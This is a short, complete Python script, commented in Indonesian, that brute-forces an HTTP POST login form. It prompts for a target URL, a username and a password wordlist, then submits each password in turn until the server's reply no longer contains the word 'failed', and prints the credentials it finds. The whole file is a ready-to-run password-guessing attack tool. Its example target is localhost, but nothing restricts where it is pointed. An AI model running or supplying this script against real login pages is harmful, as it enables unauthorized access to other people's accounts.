import requests

print("--- HTTP POST Login Brute-Forcer ---")
print("-" * 50)

# 1. Meminta input konfigurasi dari pengguna
target_url = input("Masukkan URL Login (contoh: http://127.0.0.1:8080): ")
target_username = input("Masukkan Username target (contoh: admin): ")
wordlist_file = input("Masukkan nama file wordlist (contoh: pass.txt): ")

# Indikator teks yang menandakan login gagal (berdasarkan respons server)
failure_indicator = "failed"

print("-" * 50)

try:
    # 2. Membaca daftar kata sandi dari file
    with open(wordlist_file, "r") as file:
        password_list = file.read().splitlines()
        
    print(f"[*] Berhasil memuat {len(password_list)} kata sandi dari '{wordlist_file}'.")
    print("[*] Memulai proses brute-force...\n")
    
    # 3. Looping pengiriman request POST
    for password in password_list:
        if password == "":
            continue # Abaikan baris kosong
            
        # Menyiapkan payload data untuk form login
        payload = {
            "username": target_username,
            "password": password
        }
        
        try:
            # Mengirim HTTP POST request
            response = requests.post(target_url, data=payload)
            
            # Memeriksa apakah teks indikator gagal TIDAK ada di halaman balasan
            if failure_indicator not in response.text.lower():
                print(f"[+] Login Berhasil!")
                print(f"    Username : {target_username}")
                print(f"    Password : {password}")
                break # Hentikan proses jika password yang benar ditemukan
            else:
                print(f"[-] Gagal: {password}")
                
        except requests.exceptions.RequestException:
            print("\n[x] Error: Tidak dapat terhubung ke server target.")
            break
            
except FileNotFoundError:
    print(f"\n[x] Error: File wordlist '{wordlist_file}' tidak ditemukan.")

print("-" * 50)
print("--- Proses Selesai ---")
